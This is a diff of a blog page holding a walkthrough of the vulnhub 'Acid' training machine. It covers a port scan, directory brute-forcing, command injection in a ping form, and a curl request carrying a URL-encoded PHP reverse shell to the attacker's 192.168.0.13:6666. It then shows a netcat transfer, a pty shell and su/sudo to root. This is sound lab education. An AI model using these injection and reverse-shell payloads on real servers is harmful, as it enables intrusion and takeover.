@@ -93,7 +93,8 @@
     </header>
 
     <div class="entry-content">
-            <p><img alt="acid" class="align-left" src="/media/2015.09/bg.jpg" width="262"/></p>
+            <p><img class="align-left"
+src="/media/2015.09/bg.jpg" alt="acid" width="262"></p>
 <p>Since <a href="http://maggick.fr/2015/06/vulnhub-fart-knocker.html">Fart knocker</a>
 in June I have worked on an other vulnhub machine:
 <a href="https://www.vulnhub.com/entry/darknet-10,120/">darknet</a>. But this one is really
@@ -101,12 +102,13 @@ hard and get me stuck. I was a bit demotivated to continue vulnhub's machines bu
 I got some time this week, therefore I tried the
 <a href="https://www.vulnhub.com/entry/acid-server,125/">Acid</a> one.</p>
 
+
 <p>The goal is as usual, get root on the virtual machine. Let's go:</p>
-<h2 id="host discovery">Host Discovery</h2>
+<h2>Host Discovery</h2>
 <p>As always, we start with host discovery:
 <a href="http://nmap.org">Nmap</a> and <a href="https://cirt.net/Nikto2">nikto</a> are our friends for
 this step.</p>
-<h3 id="nmap">nmap</h3>
+<h3>nmap</h3>
 <p>We launch nmap against the virtual machine:</p>
 <div class="highlight"><pre><span></span>$ nmap 192.168.0.18 -p0-65535 -A -oA nmap
 Starting Nmap 6.47 ( http://nmap.org ) at 2015-09-08 12:08 CEST
@@ -122,12 +124,14 @@ PORT      STATE SERVICE
 Service detection performed. Please report any incorrect results at
 http://nmap.org/submit/ .
 </pre></div>
+
+
 <p>We got a nice Apache web server with a simple splash screen. Notice the page
 title: <strong>/Challenge</strong>.</p>
-<h3 id="nikto">Nikto</h3>
+<h3>Nikto</h3>
 <p>I ran nikto on the target but nothing pop out.</p>
-<h2 id="web exploitation_1">Web exploitation</h2>
-<h3 id="page source">Page source</h3>
+<h2>Web exploitation</h2>
+<h3>Page source</h3>
 <p>As we come pretty empty handed, we check the page source and two interesting
 things came out:</p>
 <ul>
@@ -135,7 +139,7 @@ things came out:</p>
 <li>the title of the page (we can see it in the nmap scan) is /Challenge
     and there is an other web page at this address.</li>
 </ul>
-<h4 id="hexa code">Hexa code</h4>
+<h4>Hexa code</h4>
 <p>We will start with the first lead the hexadecimal code:</p>
 <p><strong>0x643239334c6d70775a773d3d</strong></p>
 <p>We convert it to string and we got:</p>
@@ -146,9 +150,9 @@ things came out:</p>
 web page):</p>
 <p>http://192.168.0.18:33447/images/wow.jpg</p>
 <p>As a result we got a nice image that reward us for our success.</p>
-<p><img alt="wow.jpg" src="/media/2015.09/wow.jpg"/></p>
+<p><img alt="wow.jpg" src="/media/2015.09/wow.jpg"></p>
 <p>Yeah it seems to be some troll :)</p>
-<h3 id="/challenge_1">/Challenge</h3>
+<h3>/Challenge</h3>
 <p>Let us dig the second lead: the page title. By adding <code>/Challenge</code> in the URL,
 we land on an authentication interface.</p>
 <p>I tried to use SQL injection but nothing. We will try
@@ -195,6 +199,8 @@ Files found with a 302 responce:
 
 --------------------------------
 </pre></div>
+
+
 <p>We got the <code>cake.php</code> page but as we all know "The cake is a lie". We noticed
 that the page title is one more time a folder: <code>/Magic_box</code>.
 When going to <code>/Challenge/Magic_box</code> we got a 403 forbidden page. Let us fire
@@ -230,8 +236,10 @@ Files found with a 302 responce:
 
 --------------------------------
 </pre></div>
+
+
 <p>We got some nice result mostly the <code>/command.php</code> page.</p>
-<h3 id="command execution">Command execution</h3>
+<h3>Command execution</h3>
 <p>The page let us ping an other machine in the network. Nevertheless the page name
 let us think that we can use command exploitation. If we add a <code>;</code> in the filed
 and a command it seems to works, for instance with <code>; ls</code> we got (I use
@@ -245,10 +253,12 @@ low.php
 proc
 tails.php
 </pre></div>
+
+
 <p>We can also read <code>/etc/passwd</code>: there is two users on the server: acid and
 saman.</p>
 <p>Let us try to get a reverse shell with that.</p>
-<h3 id="reverse shell">reverse shell</h3>
+<h3>reverse shell</h3>
 <p>As always, a good source of information is
 <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentest monkey</a>.</p>
 <p>We know the site use php so we will try the php reverse shell first:</p>
@@ -260,20 +270,24 @@ saman.</p>
 <p>It got us a shell on the machine (without tty/pty). But executing the request in the ping
 interface each time we want the shell in painful, so I extract the curl command
 from burp:</p>
-<div class="highlight"><pre><span></span>curl -i -s -k  -X 'POST' \
-    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0' -H 'DNT: 1' -H 'Referer: http://192.168.0.18:33447/Challenge/Magic_Box/command.php' -H 'Content-Type: application/x-www-form-urlencoded' \
-    -b 'sec_session_id=2cdjrm9k6khpfiilsad1kmnpj2' \
-    --data-binary $'IP=%3B+php+-r+%27%24sock%3Dfsockopen%28%22192.168.0.13%22%2C6666%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27&amp;submit=submit' \
-    'http://192.168.0.18:33447/Challenge/Magic_Box/command.php'
+<div class="highlight"><pre><span></span>curl -i -s -k  -X &#39;POST&#39; \
+    -H &#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0&#39; -H &#39;DNT: 1&#39; -H &#39;Referer: http://192.168.0.18:33447/Challenge/Magic_Box/command.php&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; \
+    -b &#39;sec_session_id=2cdjrm9k6khpfiilsad1kmnpj2&#39; \
+    --data-binary $&#39;IP=%3B+php+-r+%27%24sock%3Dfsockopen%28%22192.168.0.13%22%2C6666%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27&amp;submit=submit&#39; \
+    &#39;http://192.168.0.18:33447/Challenge/Magic_Box/command.php&#39;
 </pre></div>
+
+
 <p>Now that we have a shell, let us see what we can do.</p>
-<h2 id="shell exploitation_1">Shell exploitation</h2>
+<h2>Shell exploitation</h2>
 <p>First we discover what is at our disposal, mostly in the <code>/home/</code>
 (<code>bash_history</code>). In the <code>/home/acid/</code> there is something interesting but
 empty:</p>
 <div class="highlight"><pre><span></span><span class="n">ls</span> <span class="o">-</span><span class="n">la</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">acid</span><span class="o">/</span><span class="p">.</span><span class="n">su</span><span class="o">*</span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="c1">--r-- 1 acid acid 0 Jul 31 17:27 /home/acid/.sudo_as_admin_successful</span>
 </pre></div>
+
+
 <p>Let us see what else we got on the machine:</p>
 <div class="highlight"><pre><span></span><span class="nx">$</span> <span class="nx">ls</span> <span class="o">/</span>
 <span class="nx">bin</span>
@@ -308,12 +322,14 @@ empty:</p>
 <span class="nx">investigate</span><span class="p">.</span><span class="nx">php</span>
 <span class="nx">$</span> <span class="nx">cat</span> <span class="o">/</span><span class="nx">s</span><span class="p">.</span><span class="nx">bin</span><span class="o">/</span><span class="nx">investigate</span><span class="p">.</span><span class="nx">php</span>
 <span class="cp">&lt;?php</span>
-<span class="k">echo</span> <span class="s2">"Now you have to behave like an investigator to catch the culprit</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s2">&quot;Now you have to behave like an investigator to catch the culprit</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
 <span class="o">?</span>
 </pre></div>
+
+
 <p>That is interesting the php file in <code>/s.bin/</code> clearly tell us to investigate.
 But what we need know is a privilege escalation ti gain root access.</p>
-<h3 id="privilege escalation">Privilege escalation</h3>
+<h3>Privilege escalation</h3>
 <p>I tried the overlayfs exploit (the same as with
 <a href="http://maggick.fr/2015/06/vulnhub-fart-knocker.html">Fart knocker</a>)
 without success:</p>
@@ -331,7 +347,7 @@ exploit failed</p>
 </li>
 </ul>
 <p>But we were given an hint.</p>
-<h3 id="more investigations">More investigations</h3>
+<h3>More investigations</h3>
 <p>The <a href="http://pwnwiki.io/#!privesc/linux/index.md">pwnwiki.io</a> wiki is always a
 good source of information. So with more investigation we look at bash_history,
 search for <code>*txt*</code> files, an so on. Then <code>*pcap*</code> files:</p>
@@ -362,8 +378,10 @@ search for <code>*txt*</code> files, an so on. Then <code>*pcap*</code> files:</
 <span class="o">/</span><span class="nv">var</span><span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">dpkg</span><span class="o">/</span><span class="nv">info</span><span class="o">/</span><span class="nv">libpcap0</span>.<span class="mi">8</span>:<span class="nv">i386</span>.<span class="nv">symbols</span>
 <span class="o">/</span><span class="nv">var</span><span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">dpkg</span><span class="o">/</span><span class="nv">info</span><span class="o">/</span><span class="nv">libpcap0</span>.<span class="mi">8</span>:<span class="nv">i386</span>.<span class="nv">list</span>
 </pre></div>
+
+
 <p>Yes <code>/sbin/raw_vs_isi/hint.pcapng</code>!</p>
-<h3 id="pcap">pcap</h3>
+<h3>pcap</h3>
 <p>We transfer the file with netcat:</p>
 <ul>
 <li>On our attack machine: <code>nc -lp 1234 &gt; pcap</code></li>
@@ -385,23 +403,29 @@ What was the name of the Culprit ???</p>
 </blockquote>
 <p>Great, what does it means? We know that saman is one of the user on the machine.
 Maybe we got some hints about it password or something like that.</p>
-<h3 id="interactive shell">interactive shell</h3>
+<h3>interactive shell</h3>
 <p>In order to execute a su, we need a interactive shell (with
 <a href="https://en.wikipedia.org/wiki/Pseudoterminal">pty/tty</a>).
 Once more <a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">pentest monkey</a>
 will help us:</p>
-<div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import pty; pty.spawn("/bin/sh")'</span>
+<div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
 </pre></div>
+
+
 <p>As <code>/bin/sh</code> is a symlink to dash, we directly use bash:</p>
-<div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+<div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
 </pre></div>
+
+
 <p>We now need to try to connect as saman.</p>
-<h2 id="saman_1">Saman</h2>
+<h2>Saman</h2>
 <p>With our beautiful shell we jut have to <code>su saman</code> to try to connect as saman:</p>
 <div class="highlight"><pre><span></span><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@acid</span><span class="err">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">Challenge</span><span class="o">/</span><span class="n">Magic_Box</span><span class="err">$</span><span class="w"> </span><span class="n">su</span><span class="w"> </span><span class="n">saman</span><span class="w"></span>
 <span class="n">su</span><span class="w"> </span><span class="n">saman</span><span class="w"></span>
 <span class="nl">Password</span><span class="p">:</span><span class="w"> </span><span class="mi">1337</span><span class="n">hax0r</span><span class="w"></span>
 </pre></div>
+
+
 <p>It works! Let us try <code>sudo su</code>:</p>
 <div class="highlight"><pre><span></span><span class="nv">saman</span>@<span class="nv">acid</span>:<span class="o">/</span><span class="nv">var</span><span class="o">/</span><span class="nv">www</span><span class="o">/</span><span class="nv">html</span><span class="o">/</span><span class="nv">Challenge</span><span class="o">/</span><span class="nv">Magic_Box</span>$ <span class="nv">sudo</span> <span class="nv">su</span>
 <span class="nv">sudo</span> <span class="nv">su</span>
@@ -418,9 +442,11 @@ will help us:</p>
 <span class="nv">I</span>  <span class="nv">hope</span> <span class="nv">you</span> <span class="nv">like</span> <span class="nv">it</span>.
 
 
-<span class="nv">FLAG</span> <span class="nv">NAME</span>: <span class="s2">"</span><span class="s">Acid@Makke@Hax0r</span>
+<span class="nv">FLAG</span> <span class="nv">NAME</span>: <span class="s2">&quot;</span><span class="s">Acid@Makke@Hax0r</span>
 </pre></div>
-<h2 id="conclusion">Conclusion</h2>
+
+
+<h2>Conclusion</h2>
 <p>It was a nice box to root but as I read the other write up it seems that my way
 was not the one expected.
 Nevertheless, thank to <a href="https://twitter.com/m_avinash143">Avinash Kumar Thapa</a>
